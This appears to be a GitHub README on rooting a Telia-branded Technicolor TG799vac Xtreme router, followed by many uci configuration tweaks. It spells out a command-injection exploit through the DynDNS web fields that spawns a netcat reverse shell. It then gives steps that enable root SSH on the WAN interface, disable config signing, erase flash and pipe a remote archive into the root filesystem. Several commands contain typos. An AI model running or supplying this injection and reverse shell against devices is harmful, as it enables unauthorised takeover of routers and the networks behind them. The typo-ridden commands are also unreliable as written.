# README

![Screenshot](files/tg799vacv2.gif)


   Alright guys, i have bricked my old TG799VAC-XTREME when i figured out how to generate the access key so I just got my new TG799 VAC Xtreme2 with version 17.2 Mint, 
   ofc i have hacked this one aswell since i DO not want backdoors in my network..

   I have not found any other tutorial how-to hack this version from technicolor in this way I have done it. Someone has to be the first on a new exploit and let everyone know what's really is an open door straight into your 
   network and your digital life. This is 
   nothing people just should say things like "i do not care" cause this can really be abused if there is some blackhat hacker on the support or if someone just is curios about your life and has enough freetime . With TSHARK or WSHARK they can sniff ALL your traffic no matter what ppl say since the router is the last point in 'almost' all home-networks. I exposing Telia again cause i see this as a REAL threat to our privacy...I had never questioned this if the providers had been straight and honest about what they actually 
   have access to. I will expose every setting, every ip and every key i can found until they will remove the backdoors. Now im bored so let's start i really hate to write descs and the faster you get this information, the faster you can protect yourself from the backdoors. 

##### FIRST SOME RLY SCARRY SHIT THAT USERS HAS NO KNOWLEDGE ABOUT AT ALL!! 

###### The question is who has access to the logs from our router on the ip number you see in the picture below, why should they receive a lot of data from the router? They have gone so far so they storing logs when you start & 
restore the router, what are they doing with this data? This is really unpleasant and people really have no idea that things they do in their own home getting stored on a server in Stockholm / Telia. (whois the ip)

![Screenshot](files/wth.png)

#### Do you look forward to upgrade your firmware without any third party software or without any backdoors from your internet provider? Great, i will show you how you will do this easier then ever..

###### You have to add our admin user to upgradefw role and after this has been done you will get access. I have added a preview below the commands where to upload your new firmware (THIS IS DANGEROUS - DONT PLAY WITH THIS IF YOU HAVE NO KNOWLEDGE ABOUT HOW THIS WORKS IT WILL PROBABLY BRICK YOUR DEVICE WITH WRONG FIRMWARE, PERMANENT!):

    uci add_list web.uidefault.upgradefw_role='admin'
    uci commit
    
###### If you wanna become a superuser user or telia admin without do any major changes just change admin role: 

![Screenshot](files/wuseman.pwned.telia.png)

     uci set web.usr_Administrator.role='superuser'
    
![Screenshot](files/upgrade_firmware.png)

##### Add your own user without any extra tools.

![Screenshot](files/adduser.gif)

##### When things gets broken you can run the command below and you will reset * settings:

![Screenshot](files/erase-rootfs.gif)

      mtd -r erase rootfs_data

##### When you gonna install custom packages from any arch there might be a little problem with term, this is how you will fix it:

![Screenshot](files/install-opkg-packages.gif)

###### With below setting you will be allowed to install packages from more repos:

     cat > /etc/opkg.conf

      dest root /
      dest ram /tmp
      lists_dir ext /var/opkg-lists
      option overlay_root /overlay
      arch all 1
      arch noarch 1
      arch brcm63xx 3
      arch brcm63xx-tch 10


###### Run uci-whois.sh for whois all ip-adresses that has been added to configuration files from your internet provider: 

![Screenshot](files/whois.gif)

# HOWTO GET ROOT ACCESS FROM WEBGUI:

##### Let's begin. Fire up a terminal of any kind and just run the awesome netcat tool and listen on a port.

    nc -lvvp [machine_port]

##### Go to the WAN Services and press SHOW ADVANCED. In username, password and domain field you need type the below command, after this is done just enable the dyndns. It wont matter wich hoster you choose just pick one, press save and just wait 4-5 seconds and you have just got full root access of your TG799VAC Xtreme 17.2 Mint, check preview video above if you do not understand.

    :::::::`nc [machine_IP] [machine_port] -e /bin/sh`

###### In netcat window you will see something similiar and that means you are in:

    listening on [any] 1337 ...
    connect to [192.168.1.144] from router [192.168.1.1] 40980

##### Now we got full control. Let us now allow SSH permanent, copy paste commands below:

    rm /etc/dropbear/*
    uci delete dropbear.mgmt &> /dev/null
    uci delete dropbear.mgmt.PasswordAuth &> /dev/null
    uci delete dropbear.mgmt.RootPasswordAuth &> /dev/null
    uci delete dropbear.mgmt.Port &> /dev/null 
    uci delete dropbear.mgmt.Interfac e&> /dev/null
    uci delete dropbear.mgmt.AllowedClientIPs &> /dev/null
    uci delete dropbear.mgmt.enable &> /dev/null
    uci delete dropbear.mgmt.IdleTimeout &> /dev/null 
    uci set dropbear.wan=dropbear
    uci set dropbear.wan.PasswordAuth='off'
    uci set dropbear.wan.RootPasswordAuth='on'
    uci set dropbear.wan.Port='22'
    uci set ropbear.wan.Interface='wan'
    uci set dropbear.wan.AllowedClientIPs='wanip'
    uci set dropbear.wan.IdleTimeout='3600'
    uci set dropbear.wan.enable='1'
    uci set dropbear.lan=dropbear
    uci set ropbear.lan.PasswordAuth='on'
    uci set dropbear.lan.RootPasswordAuth='on'
    uci set dropbear.lan.Interface='lan'
    uci set dropbear.lan.enable='1'
    uci set dropbear.lan.IdleTimeout='3600'
    uci set dropbear.lan.Port='22'
    uci set web.uidefault.nsplink='https://www.wuseman.com'
    uci set system.config.export_plaintext='1'
    uci set system.config.export_unsigned='1'
    uci set system.config.import_plaintext='1'
    uci set system.config.import_unsigned='1'
    uci set clash.main_config=single_config
    uci set clash.main_config.module_path='/usr/lib/lua/clash/modules'
    uci set clash.main_config.log_level='3'
    uci set clash.engineer=user
    uci set clash.engineer.ssh='1'
    uci set clash.engineer.telnet='1'
    uci set clash.engineer.serial='1'
    uci set clash.engineer.ssh_key='username@hostname'
    uci set web.uidefault.upgradefw_role='adminusi ch'
    /etc/init.d/dropbear restart; uci commit; exit
    ssh root@192.168.1.1 "tee -a /etc/dropbear/authorized_keys" < ~/.ssh/id_rsa.pub; ssh root@192.168.1.1
    

  
##### If WEBGUI is broken then you allways can reset your router with 'rtfd --all' command, use 'rtfd --soft' for keep settings.

![Screenshot](files/reset-router-with-rtfd-if-webgui-crashed.gif)

##### Banner (our internet providers have given us an firmware with absolutely minimal features, fuck you!!)

![Screenshot](files/webgui_default.png)

##### Banner(Default)

![Screenshot](files/banner_before_default.png)

###### When you have root access on your router you will be able to unlock rootfs_data and install a very powerful gui vs original from Telia thanks to Ansuel and other awesoem developers by below command:

    curl -k https://repository.ilpuntotecnico.com/files/Ansuel/AGTEF/GUI.tar.bz2 --output /tmp/GUI.tar.bz2; bzcat /tmp/GUI.tar.bz2 | tar -C / -xvf -; /etc/init.d/rootdevice force; reboot

    Now go visit http://192.168.1.1 and you will see a brand new GUI interface. Default login: username: admin - password:admin

##### This is how it will look a like: 

![Screenshot](files/login-screen-after-root.png)

##### Screenshot on Stats view:

![Screenshot](files/stats-view.gif)

##### Telstra Extension: 

![Screenshot](files/telstra-gui.png)

##### I got LUCI installed but i do not recommend it and i do not use it myself, just tried for fun:  

![Screenshot](files/wusemans_pwnS-100-percent-complete-hacking.png)

##### This is an example for default setup with more lua cards:

![Screenhot](files/telia_added_few_features.png)

##### Mount root as read and write

    mount -o remount,rw /

##### If you are lazy and want things sorted as i do, then run below command: 

![Screenshot](files/sorted-dirs.gif)

    mkdir uci_settings; cd uci_settings;
    for settings in $(uci show | awk -F. '{print $1}' | uniq);do uci show $settings > $settings;done

##### Setup your dns provider from commandline:

    cat > /etc/config/ddns
    config service 'myddns_ipv4'
        option interface 'wan'
        option ip_source 'network'
        option ip_network 'wan'
        option use_https '1'
        option cacert 'IGNORE'
        option force_interval '36500'
        option force_unit 'days'
        option enabled '1'
        option password 'password'
        option username 'domain.com'
        option service_name 'loopia.se'
        option lookup_host 'domain.com'
        option domain 'domain.com'

##### List product, serial, ssid prefix etc by below command:

    cat /var/hostapd.env | sed 's/^_//g' | sed 's/=/ ===> /g'
    COMPANY_NAME ===> Technicolor
    PROD_NAME ===> MediaAccess TG
    PROD_NUMBER ===> Telia WiFi-router Plus v3
    PROD_FRIENDLY_NAME ===> Telia WiFi-router Plus v3
    VARIANT_FRIENDLY_NAME ===> TG799TSvac Xtream
     SSID_SERIAL_PREFIX ===> TNCAP
    BOARD_NAME ===> VBNT-H
    BOARD_SERIAL_NBR ===> SECRET
    PROD_SERIAL_NBR ===> SECRET
    MACADDR ===> E0-B9-15-23-22-54
    WL_MACADDR ===> E0-B9-15-23-45-55

##### List all files where "password=" is stored: 

    sudo grep -rP -w -e 'password=' .| grep -v Binary | grep -v ddns
    
##### List all files where you can find your serial: 

    find . -type f | xargs grep -e 'SERIAL' | cut -d':' -f1 | grep / | uniq

##### Setup local hostnames:

     cat >> /etc/config/dhcp
     config host
        option name 'moms.ipad'
        option mac 'macaddr'
        option ip 'prefered.localip''

    config host
        option name 'dads.linux.laptop'
        option mac 'macaddr'
        option ip 'prefered.localip'


##### First of all we want to change telia > admin in all lp files.

    sed -i 's/telia/admin/' /www/docroot/modals/gateway-modal.lp
    sed -i 's/telia/admin/' /www/docroot/modals/internet-modal.lp 
    sed -i 's/telia/admin/' /www/docroot/modals/mmpbx-global-modal.lp 
    
![Screenshot](files/beforeandafter.png)

##### Below will add a new VPN modal in webgui ( Confirmed to work on 16.2 Jade + 17.2 Mint ):

    cat >> /etc/config/web
       list rules 'l2tpipsecservermodal'
       config rule 'l2tpipsecservermodal'
       option target '/modals/l2tp-ipsec-server-modal.lp'
       list roles 'admin'
       list roles 'engineer'
    
![Screenshot](files/vpn-in-webgui.png)

### IT IS VERY IMPORTANT TO ADD BELOW COMMANDS IN SAME ORDER I LISTED THEM. 
###### IF YOU ADD THEM IN WRONG ORDER YOU GET A ERROR MESSAGE: 'uci: Invalid Argument'

##### Rules

     uci add_list web.uidefault.upgradefw_role='admin'
     uci set web.natalghelpermodal=rule
     uci set web.relaymodal=rule
     uci set web.systemmodal=rule
     uci set web.iproutesmodal=rule
     uci set web.mmpbxinoutgoingmapmodal=rule
     uci set web.ltedoctor=rule
     uci set web.ltemodal=rule
     uci set web.lteprofiles=rule
     uci set web.ltesim=rule
     uci set web.ltesms=rule
     uci set web.logconnections=rule
     uci set web.logviewer=rule
     uci set web.logviewer.roles=rule
     uci set tod.global.enabled='1'
     uci set mobiled.globals.enabled='1'
     suci et mobiled.device_defaults.enabled='1'

     uci commit; /etc/init.d/nginx restart

##### Ruleset

     uci add_list web.ruleset_main.rules=xdsllowmodal
     uci add_list web.ruleset_main.rules=systemmodal
     uci add_list web.ruleset_main.rules=natalghelpermodal
     uci add_list web.ruleset_main.rules=diagnostics
     uci add_list web.ruleset_main.rules=basicviewaccesscodemodal
     uci add_list web.ruleset_main.rules=basicviewwifiguestmodal
     uci add_list web.ruleset_main.rules=basicviewwifiguest5GHzmodal
     uci add_list web.ruleset_main.rules=basicviewwifipskmodal
     uci add_list web.ruleset_main.rules=basicviewwifipsk5GHzmodal
     uci add_list web.ruleset_main.rules=basicviewwifissidmodal
     uci add_list web.ruleset_main.rules=basicviewwifissid5GHzmodal
     uci add_list web.ruleset_main.rules=relaymodal
     uci add_list web.ruleset_main.rules=iproutesmodal
     uci add_list web.ruleset_main.rules=mmpbxinoutgoingmapmodal
     uci add_list web.ruleset_main.rules=mmpbxstatisticsmodal
     uci commit; /etc/init.d/nginx restart

##### Target ( You will get even more stuff in webinterface after you run below commands )

     uci set web.mmpbxinoutgoingmapmodal.target='/modals/mmpbx-inoutgoingmap-modal.lp'
     uci set web.iproutesmodal.target='/modals/iproutes-modal.lp'
     uci set web.systemmodal.target='/modals/system-modal.lp'
     uci  set web.relaymodal.target='/modals/relay-modal.lp'
     uci set web.natalghelpermodal.target='/modals/nat-alg-helper-modal.lp'
     uci set web.diagnosticstcpdumpmodal.target='/modals/diagnostics-tcpdump-modal.lp'
     uci set web.natalghelpermodal.target='/modals/basicview-accesscode-modal.lp'
     uci set web.natalghelpermodal.target='/modals/basicview-wifiguest-modal.lp'
     uci set web.natalghelpermodal.target='/modals/basicview-wifiguest5GHz-modal.lp'
     uci set web.natalghelpermodal.target='/modals/basicview-wifipsk-modal.lp'
     uci set web.natalghelpermodal.target='/modals/basicview-wifipsk5GHz-modal.lp'
     uci set web.natalghelpermodal.target='/modals/basicview-wifissid-modal.lp'
     uci set web.natalghelpermodal.target='/modals/basicview-wifissid5GHz-modal.lp'
     uci set web.ltemodal.target='/modals/lte-modal.lp'
     uci set web.ltedoctor.target='/modals/lte-doctor.lp'
     uci set web.lteprofiles.target='/modals/lte-profiles.lp'
     uci set web.logconnections.target='/modals/log-connections-modal.lp'
     uci set web.logviewer.target='/modals/logviewer-modal.lp'
     uci set web.ltesms.target='/modals/lte-sms.lp'
     uci set web.ltesim.target='/modals/lte-sim.lp'
     uci set web.xdsllowmodal.target='/modals/xdsl-low-modal.lp'
     uci commit; /etc/init.d/nginx restart

##### Roles ( You will see new stuff on webinterface after you run below commands)

     uci add_list web.assistancemodal.roles='admin' 
     uci add_list web.usermgrmodal.roles='admin'
     uci add_list web.cwmpconf.roles='admin'
     uci add_list web.todmodal.roles='admin'
     uci add_list web.iproutesmodal.roles='admin'
     uci add_list web.natalghelper.roles='admin'
     uci add_list web.mmpbxglobalmodal.roles='admin' 
     uci add_list web.mmpbxprofilemodal.roles='admin' 
     uci add_list web.parentalblock.roles=admin
     uci add_list web.mmpbxinoutgoingmapmodal.roles='admin'
     uci add_list web.systemmodal.roles='admin'
     uci add_list web.relaymodal.roles='admin'
     uci add_list web.natalghelpermodal.roles='admin'
     uci add_list web.diagnosticstcpdumpmodal.roles='admin'
     uci add_list web.ltedoctor.roles="admin"
     uci add_list web.ltemodal.roles="admin"
     uci add_list web.lteprofiles.roles="admin"
     uci add_list web.xdsllowmodal.roles='admin'
     uci add_list web.ltesim.roles="admin"
     uci add_list web.logconnections.roles="admin"
     uci add_list web.logviewer.roles="admin"
     uci add_list web.logconnections.roles="admin"
     uci add_list web.home.roles='admin'
     uci add_list web.ltesms.roles='admin'
     uci add_list web.logviewer.roles="admin"
     commit; /etc/init.d/nginx restart

##### All kind of stuff for webgui (Nothing special, edit them after your needs)

    sed -i 's/The standard Username is 'Administrator'."/wuseman/g' /www/docroot/login.lp
    sed -i 's/Technicolor/This router has been hacked by wuseman/g' /www/docroot/*.lp
    sed -i 's/Technicolor/This router has been hacked by wuseman/g' /www/docroot/*.lp

##### IF YOU WANNA BE ELITE AND EDIT THE SETTINGS FROM COMMANDLINE INSTEAD HERE IS SOME EXAMPLES YOU CAN USE:

###### Give a device on your localnetwork a custom hostname: 

    cat >> /etc/config/dhcp
    # WUSEMAN WAS HERE
    # EDITED: 2018-08-14

    config host
    option name 'hostname'
    option mac 'macaddr'
    option ip 'localip'

###### Open a new port: 

    cat >> /etc/config/firewall 
    # WUSEMAN WAS HERE
    # EDITED: 2018-08-14

    config userredirect 'userredirectXXDD'
    option dest_port '<PORTNUMBER>'
    option dest 'lan'
    option src 'wan'
    list proto '<tcp>/<udp>/<tcpudp>'
    option enabled '<1>/<0>'
    option name 'CUSTOMNAMEINWEBINTERFACE'
    option src_dport '<PORTNUMBER>'
    option family '<ipv4>/<ipv6>'
    option target 'DNAT'
    option dest_ip '<lanip>'

##### Wanna have some fun? Edit all false to true and vice versa ;p 
###### DO THIS ON YOUR OWN RISK ( YOU HAVE BEEN WARNED )

    sed -i 's/false/true/g' /www/cards/*.lp
    sed -i 's/false/true/g' /www/lua/*.lua
    sed -i 's/false/true/g' /www/modals/*.lp
    sed -i 's/false/true/g' /www/snippets/*.lp
    sed -i 's/false/true/g' /www/docroot/*.lp
    sed -i 's/false/true/g' /www/docroot/
    sed -i 's/false/true/g' /www/docroot/ajax/*.lua

##### Add admin to everything and remove supuser and admin
###### DO THIS ON YOUR OWN RISK ( YOU HAVE BEEN WARNED )
    
    sed -i 's/false/true/g' /www/cards/010_lte.lp
    sed -i 's/telia/admin/' /www/docroot/modals/gateway-modal.lp
    sed -i 's/telia/admin/' /www/docroot/modals/internet-modal.lp 
    sed -i 's/telia/admin/' /www/docroot/modals/mmpbx-global-modal.lp 
    sed -i 's/superuser/admin/' /www/docroot/modals/gateway-modal.lp
    sed -i 's/superuser/admin/' /www/docroot/modals/internet-modal.lp 
    sed -i 's/superuser/admin/' /www/docroot/modals/mmpbx-global-modal.lp 
    uci commit

##### List all URLs for your firmware that can be downloaded:

    strings /etc/cwmpd.db 

    SQLite format 3
    tabletidkvtidkv
    CREATE TABLE tidkv (  type TEXT NOT NULL,  id TEXT NOT NULL,  key TEXT NOT NULL,  value TEXT,  PRIMARY KEY (type, id, key)))
    indexsqlite_autoindex_tidkv_1tidkv
    transferPassword5
    transfer Username
    Stransfer URLhttp://192.168.21.52:7547/ACS-server
    5transferaStartTime2018-08-19T15:20:13Z
    transfera FaultStringcomplete
    transfera FaultCode0M_
    M%5transfera CompleteTime2018-08-19T15:19:57Z
    'transfera TimeStamp244,9XXXXXX
    transfera DelaySeconds3
    transfera Password
    transfera Username
    runtimevarParameterKey#
    runtimevarConfigurationVersionD
    %_runtimevarBootStrappedhttps://acs.telia.com:7575/ACS-server/ACS-
    +/VersionsSoftwareVersion16.2.XXXXXX
    transfer FaultString
    transfer FaultCode
    transfer TimeSt6
    transfera UsernameU
    transfera URLT7
    transfera TimeStampX
    transfera SubStatec
    transfera Stateb7
    transfera StartTimed
    transfera PasswordV
    
##### OTHER TIPS & TRICKS  
    
##### Changing max sync speed on your modem:

    uci set xdsl.dsl0.maxaggrdatarate='200000' # 16000 default
    uci set xdsl.dsl0.maxdsdatarate='140000'   # 11000 default
    uci set xdsl.dsl0.maxusdatarate='60000'    # 40000 default
   
##### Enable/Disable dnsmasq:
 
    uci show dhcp.lan.ignore='1'

##### Enable/Disable network time server

    uci set system.ntp.enable_server='1'
     
##### Using bridge mode with a dedicated PPPoE ethernet port:
  
    uci set network.lan.dns='1.1.1.1'
    uci set network.lan.gateway='192.168.0.254'
    uci set mmpbxrvsipnet.sip_net.interface='lan'
    uci set mmpbxrvsipnet.sip_net.interface6='lan6'
    uci commit

##### You can check the current running dns with:

    cat /etc/resolv.conf
    
##### Edit nsplink to something else (where you get redirected when you click on the logo at top) 

    uci set web.uidefault.nsplink='https://sendit.nu'
    
##### This will show all traffic on your router with netstat:

    netstat -tulnp 

##### This will show all ip numbers connected to your router atm..

    netstat -lantp | grep ESTABLISHED |awk '{print $5}' | awk -F: '{print $1}' | sort -u  
     
##### Capture traffic on all interfaces (add -i wl0 for include wifi):

    tcpdump -vvv -ttt -p -U
    tcpdump -i wl0 -vvv -ttt -p -U
     
##### Enable or Disable WWAN support (mobiled)

     uci set mobiled.globals.enabled='0'
     uci set mobiled.device_defaults.enabled='0'
     
##### Enable or Disable Content Sharing (Samba / DNLA)

     uci set samba.samba.enabled='1'
     uci set dlnad.config.enabled='1'

##### To view currently dhcp leases:

     cat /tmp/dhcp.leases
     1534969000 macaddr lanip machine macaddr

##### To view all ipv4 adresses from uci settings:

     uci show | grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b"
     
##### Example on how-to add a new new modal:

    uci set web.modalsmodalrule=rule
    uci set web.ruleset_main.rules=modalsmodalsrule
    uci add_list web.l2tpipsecservermodal.target='/modals/modals-name.lp'
    uci set web.l2tpipsecservermodal.roles='roles'
    uci commit; /etc/init.d/nginx restart

##### Enable/Disable web gui:

     uci set web.remote.active='1'

##### List arp.log
 
     cat /tmp/arp.log
     root@OpenWrt:/tmp# cat /tmp/arp.log 
     IP address       HW type     Flags       HW address            Mask     Device
     lanip            0x1         0x2         X0:X0:X0:X0:X0:X0      *        br-lan
     mgmt_ip          0x1         0x2         X0:X0:X0:X0:X0:X0     *        vlan_mgmt
     wanip            0x1         0x2         X0:X0:X0:X0:X0:X0     *        eth4
     
##### List all interfaces mac-addresses

    ifconfig -a  | sed '/eth\|wl/!d;s/ Link.*HWaddr//'
    eth0      X0:X0:X0:X0:X0:X0  
    eth1      X0:X0:X0:X0:X0:X0 
    eth2      X0:X0:X0:X0:X0:X0  
    eth3      X0:X0:X0:X0:X0:X0 
    eth4      X0:X0:X0:X0:X0:X0 
    eth5      X0:X0:X0:X0:X0:X0 
    vlan_eth0 X0:X0:X0:X0:X0:X0 
    vlan_eth1 X0:X0:X0:X0:X0:X0  
    vlan_eth2 X0:X0:X0:X0:X0:X0   
    vlan_eth3 X0:X0:X0:X0:X0:X0  
    vlan_eth5 X0:X0:X0:X0:X0:X0 
    wl0       X0:X0:X0:X0:X0:X0 
    wl0_1     X0:X0:X0:X0:X0:X0   
    wl0_2     X0:X0:X0:X0:X0:X0  
   
##### Remove trafficmon settings:

     uci delete system.@trafficmon[0].interface=''
     uci delete system.@trafficmon[0].minute=''
     uci delete system.@trafficmon[1].interface=''
     uci delete system.@trafficmon[1].minute=''
     uci delete system.@trafficmon[2].interface=''
     uci delete system.@trafficmon[2].minute=''
     uci delete system.@trafficmon[3]=trafficmon
     uci delete system.@trafficmon[3].interface=''
     uci delete system.@trafficmon[3].minute=''
     uci delete web.trafficmonitor=rule
     uci delete web.ruleset_main.rules='gateway'
     uci delete web.trafficmonitor.target='/modals/traffic-monitor.lp'
     uci delete web.trafficmonitor.roles='admin'

##### Disable Time of Day ACL rules

     uci set tod.global.enabled='0'
      
##### For login with debug mode enabled, then please go to (Proably not possible but it is to try):
     
     http://192.168.1.1/?debug=1
     
##### Disable so your router wont restart if there is an segmentation fault in a user space program.

    uci set system.@coredump[0].reboot='0'
    uci commit system

##### Just type below command for print the accesskey. (More info will get added here soon how this is generated)

    sed -e 's/^\(.\{8\}\).*/\1/' /proc/rip/0124

##### You can check the current running dns with

    cat /etc/resolv.conf
    
##### Enable or Disable WWAN support (mobiled)

     uci set mobiled.globals.enabled='1'
     uci set mobiled.device_defaults.enabled='1'
    
##### Enable or Disable Content Sharing (Samba / DNLA)

     uci set samba.samba.enabled='1'
     uci set dlnad.config.enabled='1'
     
##### To view currently dhcp leases:

     cat /tmp/dhcp.leases
     1534969000 macaddr lanip machine macaddr
     

##### Remove telia from all roles: 

    uci delete web_back.uidefault.upgradefw_role='telia'
    uci delete web_back.usr_assist.role='telia'
    uci delete web_back.gateway.roles='telia' 
    uci delete web_back.login.roles='telia' 
    uci delete web_back.password.roles='telia' 
    uci delete web_back.homepage.roles='telia' 
    uci delete web_back.gatewaymodal.roles='telia' 
    uci delete web_back.broadbandmodal.roles='telia' 
    uci delete web_back.internetmodal.roles='telia' 
    uci delete web_back.wirelessmodal.roles='telia' 
    uci delete web_back.wirelessclientmodal.roles='telia' 
    uci delete web_back.wirelessqrcodemodal.roles='telia' 
    uci delete web_back.ethernetmodal.roles='telia' 
    uci delete web_back.devicemodal.roles='telia' 
    uci delete web_back.wanservices.roles='telia' 
    uci delete web_back.firewallmodal.roles='telia' 
    uci delete web_back.diagnosticsconnectionmodal.roles='telia' 
    uci delete web_back.diagnosticsnetworkmodal.roles='telia' 
    uci delete web_back.diagnosticspingmodal.roles='telia' 
    uci delete web_back.diagnosticsxdslmodal.roles='telia' 
    uci delete web_back.diagnosticsigmpproxymodal.roles='telia' 
    uci delete web_back.assistancemodal.roles='telia' 
    uci delete web_back.usermgrmodal.roles='telia' 
    uci delete web_back.syslogmodal.roles='telia' 
    uci delete web_back.dmzmodal.roles='telia' 
    uci delete web_back.iproutesmodal.roles='telia'
    uci delete web_back.contentsharing.roles='telia' 
    uci delete web_back.parentalmodal.roles='telia'
    uci delete web_back.iptv.roles='telia'
    uci delete web_back.home.roles='telia'
    uci delete web_back.accesscode.roles='telia'
    uci delete web_back.wifissid.roles='telia'
    uci delete web_back.wifipsk.roles='telia'
    uci delete web_back.wifiguest.roles='telia'
    uci delete web_back.wifissid5GHz.roles='telia'
    uci delete web_back.wifipsk5GHz.roles='telia'
    uci delete web_back.wifiguest5GHz.roles='telia'
    uci delete web_back.mmpbxglobalmodal.roles='telia' 
    uci delete web_back.mmpbxprofilemodal.roles='telia' 
    uci delete web_back.mmpbxinoutgoingmodal.roles='telia' 
    uci delete web_back.mmpbxservicemodal.roles='telia' 
    uci delete web_back.mmpbxdectmodal.roles='telia' 

##### Disable Time of Day ACL rules

     uci set tod.global.enabled='0'
     
##### List installed packages:

    echo $(opkg list_installed | awk '{ print $1 }') 
   
##### List installed packages in a tree:

    echo $(opkg list_installed | awk '{ print $1 }') | xargs -n 1
       
### Have fun and be careful with other settings not provided by me! ;)

#### THIS WIKI IS LICENSED UNDER MIT
#### AUTHOR/OWNER OF THIS WIKI IS wuseman

# CONTACT

     If you have problems, questions, ideas or suggestions please contact
     us by posting to info@sendit.nu

# WEB SITE

     Visit our homepage for the latest info and updated tools

     https://sendit.nu & https://github.com/wuseman/

### END!








